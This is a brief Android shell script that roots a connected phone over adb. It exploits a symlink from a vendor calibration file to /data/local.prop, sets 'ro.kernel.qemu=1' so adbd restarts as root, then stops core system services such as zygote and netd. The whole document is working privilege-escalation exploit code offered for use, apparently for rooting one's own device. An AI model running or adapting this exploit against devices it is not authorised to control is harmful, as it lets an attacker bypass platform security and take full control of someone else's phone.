#!/bin/sh -v
adb wait-for-device

haveroot() {
	[[ $(adb shell echo -n '$PS1') == '#' ]]
}

haveroot && exit 0

adb shell "rm /data/local/tmp/profile_calib_m"
adb shell "ln -s /data/local.prop /data/local/tmp/profile_calib_m"
adb reboot
adb wait-for-device
adb shell "echo 'ro.kernel.qemu=1' > /data/local.prop && echo EXPLOIT; rm /data/local/tmp/profile_calib_m; adb reboot" | tee /dev/stderr | grep EXPLOIT &&
{
	adb wait-for-device
	# now adbd runs as root due to ro.kernel.qemu=1

	# to lose root on reboot
	adb shell "rm /data/local.prop"
}

haveroot || exit 1

# to stop phone thrashing
adb shell "stop ueventd"
adb shell "stop dbus"
adb shell "stop servicemanager"
adb shell "stop zygote"
adb shell "stop media"
adb shell "stop installd"
adb shell "stop netd"
adb shell "stop atd"
adb shell "stop port-bridge"
